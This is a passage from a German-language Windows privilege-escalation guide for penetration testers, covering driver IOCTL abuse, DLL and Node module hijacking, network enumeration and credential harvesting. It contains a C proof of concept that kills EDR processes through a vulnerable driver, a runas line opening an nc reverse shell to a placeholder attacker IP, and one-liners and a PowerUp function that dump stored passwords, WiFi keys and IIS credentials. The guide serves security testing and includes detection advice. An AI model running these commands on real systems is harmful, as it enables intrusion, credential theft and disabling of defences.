Starkes Suchmuster: **heterogene Registry-Lesevorgänge in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, bei denen der erste Registry-Lesevorgang darüber entscheidet, ob ein zweiter Lesevorgang ausgeführt wird.

#### Missbrauch fehlender FILE_DEVICE_SECURE_OPEN auf Geräteobjekten (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Geräteobjekt mit einer starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Gerät über einen Pfad mit einer zusätzlichen Komponente geöffnet wird. So kann jeder nicht privilegierte Benutzer über einen Namespace-Pfad wie diesen einen Handle erhalten:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulation missbrauchen. In freier Wildbahn beobachtete Beispiele für solche Möglichkeiten:
- Rückgabe von Handles mit Vollzugriff auf beliebige Prozesse (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter Raw-Disk-Lese-/Schreibzugriff (Offline-Manipulation, Persistenz-Tricks beim Booten).
- Beenden beliebiger Prozesse, einschließlich Protected Process/Light (PP/PPL), wodurch sich AV/EDR aus dem User Mode über den Kernel beenden lässt.

Minimales PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Maßnahmen für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Überprüfe bei privilegierten Vorgängen den Kontext des Aufrufers. Führe PP/PPL-Prüfungen durch, bevor du das Beenden von Prozessen oder die Rückgabe von Handles zulässt.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe Broker-Modelle anstelle direkter Kernel-Berechtigungen in Betracht.

Erkennungsideen für Defender
- Überwache Öffnungen verdächtiger Gerätenamen aus dem User Mode (z. B. \\ .\\amsdk*) sowie bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Erzwinge Microsofts Sperrliste für anfällige Treiber (HVCI/WDAC/Smart App Control) und pflege eigene Zulassungs- und Sperrlisten.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL hijacken und **deine Berechtigungen erweitern**.<sup>[[2]](#references)</sup>

Überprüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie dieser Check ausgenutzt werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js- / Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **Windows uncontrolled search path**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node löst Pakete auf, indem es den Verzeichnisbaum nach oben durchläuft und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann dieser Weg bis zum Laufwerksstamm führen. Daher kann eine Anwendung, die von `C:\Users\Administrator\project\app.js` gestartet wurde, folgende Pfade prüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit niedrigen Berechtigungen** `C:\node_modules` erstellen kann, kann er eine schädliche `foo.js` (oder einen Paketordner) platzieren und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch entsteht eine **LPE**, wenn das Ziel als Administrator, über eine Aufgabe mit erhöhten Berechtigungen/einen Service-Wrapper oder in einer automatisch gestarteten privilegierten Desktop-App läuft.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- sich das anfällige `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode befindet

### Anfällige Ziele aufspüren

Verwenden Sie **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtern Sie nach `Process Name` = Zieldatei (`node.exe`, die EXE der Electron-App oder der Wrapper-Prozess)
- Filtern Sie nach `Path` `contains` `node_modules`
- Achten Sie auf `NAME NOT FOUND` und das letzte erfolgreiche Öffnen unter `C:\node_modules`

Nützliche Muster für Code-Reviews in entpackten `.asar`-Dateien oder Anwendungsquellen:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Ausnutzung

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder durch Überprüfung des Quellcodes.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht vorhanden ist:

```powershell
mkdir C:\node_modules
```

3. Platziere ein Modul mit dem exakt erwarteten Namen:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Lösen Sie die Opferanwendung aus. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, kann Node `C:\node_modules\foo.js` laden.

Reale Beispiele für fehlende optionale Module, auf die dieses Muster zutrifft, sind `bluebird` und `utf-8-validate`. Die wiederverwendbare **Technik** ist jedoch, jeden **fehlenden Bare Import** zu finden, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Erkennungs- und Härtungsideen

- Alarmieren, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien bzw. Pakete ablegt.
- Nach Prozessen mit hoher Integrität suchen, die aus `C:\node_modules\*` lesen.
- Alle Laufzeitabhängigkeiten in der Produktion paketieren und die Verwendung von `optionalDependencies` prüfen.
- Drittanbieter-Code auf lautlose `try { require("...") } catch {}`-Muster überprüfen.
- Optionale Prüfungen deaktivieren, sofern die Bibliothek dies unterstützt (beispielsweise können manche `ws`-Deployments die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfe die hosts-Datei auf weitere bekannte Computer, die fest eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**

```bash
netstat -ano #Opened ports?
```

Bei einem lokalen Listener sollten Sie dessen PID dem Prozesseigentümer, dem ausführbaren Dateipfad und allen Diensten oder geplanten Aufgaben zuordnen, die ihn starten. Ein Fernsteuerungsdienst kann nur dann Zugriff mit den Rechten seines Desktop-Benutzers ermöglichen, wenn seine Authentifizierung und Befehlssteuerung dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die mit einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Hinweise, während ein authentifizierter Weg über eine Speicherbeschädigung eine Analyse genau dieser Binärdatei und ihrer erreichbaren Eingaben erfordert. Scheint ein offener Port zu einem Systemprozess zu gehören, vergleichen Sie ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor Sie den Backend-Dienst zuordnen; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routing-Tabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um die Firewall**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere[ Befehle zur Netzwerkerkundung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Als `root`-Benutzer kannst du an jedem Port lauschen (wenn du `nc.exe` zum ersten Mal verwendest, um an einem Port zu lauschen, wirst du über eine GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

Linux-`root` innerhalb von WSL gewährt für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, überprüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, in denen möglicherweise Zugangsdaten gespeichert wurden. Für eine Rechteausweitung sind weiterhin ein gültiges Konto mit höheren Berechtigungen und ein zulässiger Authentifizierungsweg erforderlich. Das Verzeichnislayout `LocalState\rootfs` gilt für ältere WSL-Installationen; WSL 2 speichert die Distribution häufig auf einer virtuellen Festplatte namens [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Vermeide es, bei der automatisierten Enumeration Verlaufsdateien auszugeben.

## Windows-Anmeldedaten

### Winlogon-Anmeldedaten

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Anmeldeinformationen. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Registry-Befund mit Klartextpasswort. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA-Geheimnis speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Abfragen belegen nicht, ob dieses Geheimnis existiert oder abgerufen werden kann. Prüfe die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Anmeldeinformationen meldest.

### Anmeldeinformationsverwaltung / Windows-Tresor

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Der Windows-Tresor speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, die **Windows** verwenden kann, um **Benutzer automatisch anzumelden**. Auf den ersten Blick könnte es so klingen, als könnten Benutzer Anmeldeinformationen für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen. So funktioniert es jedoch nicht.

Der Windows-Tresor speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen für den Zugriff auf eine Ressource** (einen Server oder eine Website) benötigt, **diesen Credential Manager und Windows-Tresor nutzen** und die bereitgestellten Anmeldeinformationen verwenden kann, anstatt dass Benutzer jedes Mal ihren Benutzernamen und ihr Passwort eingeben müssen.

Wenn die Anwendungen nicht mit dem Credential Manager interagieren, können sie meiner Meinung nach die Anmeldeinformationen für eine bestimmte Ressource nicht verwenden. Wenn deine Anwendung also den Tresor nutzen soll, muss sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem Standardspeichertresor anfordern.

Verwende `cmdkey`, um die auf dem Computer gespeicherten Anmeldeinformationen aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire Powershells-Modul](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstoken und Klartextpasswörter im `PasswordVault` der Universal Windows Platform (UWP) (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicherbereich ist sitzungsisoliert und kann nativ ohne Administratorrechte oder `SeDebugPrivilege` entschlüsselt werden.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter auszulesen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird im Windows-Betriebssystem vorwiegend zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Bei dieser Verschlüsselung wird ein Benutzer- oder Systemgeheimnis genutzt, um maßgeblich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden dafür die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Mit DPAPI verschlüsselte RSA-Benutzerschlüssel werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der sich zusammen mit dem Hauptschlüssel zum Schutz der privaten Schlüssel des Benutzers in derselben Datei befindet**, besteht üblicherweise aus 64 Byte zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist: Sein Inhalt kann daher nicht mit dem Befehl `dir` in CMD aufgelistet werden, wohl aber mit PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz-Modul** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **durch das Masterpasswort geschützten Anmeldedateien** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele DPAPI-**masterkeys** aus dem **Speicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Sie werden mit **DPAPI** geschützt. Das bedeutet in der Regel, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Anmeldeinformation kann einen beliebigen Dateinamen oder einen `.xml`-Pfad haben. Wenn ein Skript oder ein Dateiinventar auf eine solche Datei verweist, ermittle das tatsächliche Profilverzeichnis des Kontos, statt `C:\Users` vorauszusetzen: [Windows kann Profile an anderen Orten speichern](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Anmeldeinformation an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss separat über gültige Berechtigungen für den vorgesehenen Dienst verfügen. Prüfe zuerst Pfade und ACLs, ohne bei routinemäßigen Aufzählungen verschlüsselte oder Klartextwerte auszugeben.

Um PS-Anmeldeinformationen aus der Datei zu **entschlüsseln**, die sie enthält, kannst du Folgendes tun:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### WLAN

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Sie befinden sich unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Kürzlich ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use das Mimikatz-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` kannst du **viele DPAPI-Masterkeys aus dem Arbeitsspeicher extrahieren**

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuche lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Dokumenten des Benutzers, einschließlich Dateien mit gewöhnlichen Namen wie `config.xml`. Ermittle das Verbindungsschema und die verschlüsselten `Password`-Attribute, bevor du eine XML-Datei als möglichen Fundort für Zugangsdaten behandelst. Der gespeicherte Wert ist kein DPAPI-/RDCMan-Passwort. Die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Masterpasswort verwendet wurde. Gib bei einer umfassenden Suche keine verschlüsselten Werte aus.

**Exporte von Remote Desktop Plus-Profilen** können ebenfalls in Benutzerverzeichnissen oder einem gemeinsam genutzten Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit Elementen wie `ProfileName`, `Password` und `Secure`. Behandle ein nicht leeres Passwortelement als möglichen Fundort für Zugangsdaten, ohne es auszugeben oder davon auszugehen, dass es Klartext ist: [laut Angaben des Anbieters](https://www.donkz.nl/) kann der Profilschutz an das erstellende Konto und den Computer gebunden oder weniger streng konfiguriert sein. Überprüfe Herkunft und Wiederherstellungsbedingungen der Datei, bevor du dich darauf verlässt.

### Sticky Notes

Manchmal speichern Benutzer Passwörter und andere Informationen in Haftnotiz-Apps. Die von Microsoft bereitgestellte Sticky Notes-App speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps verwenden möglicherweise andere Speicherorte im Benutzerprofil, darunter LevelDB. Ermittle die installierte App und das Speicherformat, bevor du eine fehlende SQLite-Datei als Beleg dafür wertest, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, kann eine Kopie von `plum.sqlite` allein kürzlich bestätigte Notizen auslassen. Bewahre die passende `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und füge, sofern verfügbar, auch `plum.sqlite-shm` hinzu. Der Shared-Memory-Index kann neu erstellt werden, aber das WAL gehört zum dauerhaften Zustand der Datenbank. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein möglicher Fundort für Zugangsdaten: Überprüfe das Konto, die zulässigen Zugriffsrechte und die Wiederverwendung des Passworts separat. Ein verschlüsselter Eintrag eines Passwort-Managers erfordert außerdem den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er als Beleg für eine Anmeldung mit höheren Rechten gelten kann.

### AppCmd.exe

**Beachte, dass du Administrator sein und mit einer hohen Integritätsstufe arbeiten musst, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise **Anmeldedaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) übernommen:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installationsprogramme werden mit **SYSTEM-Berechtigungen ausgeführt**; viele sind anfällig für **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Zugangsdaten)

### Zugangsdaten-Artefakte in der Registry von Support-Tools

Einige ältere Remote-Support-Installationen behalten passwortbezogene Wertnamen unter festen Anwendungs-Registry-Schlüsseln bei. Beispielsweise kennzeichnete `SecurityPasswordAES` von TeamViewer laut der [Erläuterung des Herstellers zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Wertnamen-Marker ist lediglich ein Hinweis für die Überprüfung: Verifizieren Sie vor der Bewertung dieser Zugangsdaten die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten. Der Wechsel von einem Remote-Support-Passwort zu einem privilegierteren Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und eine Berechtigung für dieses Konto besteht. Nehmen Sie Chiffretexte und wiederhergestellte Passwörter nicht in routinemäßige Enumerationsausgaben auf.

### Freigegebene Tabellen mit geschützten Blättern

Wenn der Verdacht besteht, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und Blattschutz oder ausgeblendeten Spalten. [Microsoft erklärt](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Blattschutz die Bearbeitung einschränkt und keine Sicherheitsfunktion ist; er belegt für sich genommen nicht, dass der Inhalt der Arbeitsmappe verschlüsselt ist. Prüfen Sie nur autorisierte, relevante Dateien und vermeiden Sie es, bei breit angelegter Enumeration mögliche Geheimnisse auszugeben. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Blatt oder eine ausgeblendete Spalte allein beweist weder, dass Zugangsdaten vorhanden sind, noch, dass ein Konto höhere Berechtigungen hat. Verifizieren Sie die tatsächlichen Daten und die aktuellen Kontoberechtigungen getrennt.

### Vom CI-Server aufbewahrte Änderungspatches

